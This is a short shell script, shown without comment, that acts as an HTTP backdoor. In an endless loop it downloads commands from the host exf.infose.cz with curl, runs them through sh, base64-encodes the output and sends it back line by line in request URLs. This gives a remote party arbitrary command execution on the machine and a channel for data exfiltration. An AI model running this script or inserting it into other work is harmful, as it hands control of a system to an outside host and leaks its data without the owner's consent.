set -eu
H=https://exf.infose.cz/

i=0
while :; do
        curl -s "${H}/$$-$i" | sh | base64 | while read line; do
                curl -s "${H}/r-$$-$i-$line"
                done
        i=$(( $i + 1 ))
done
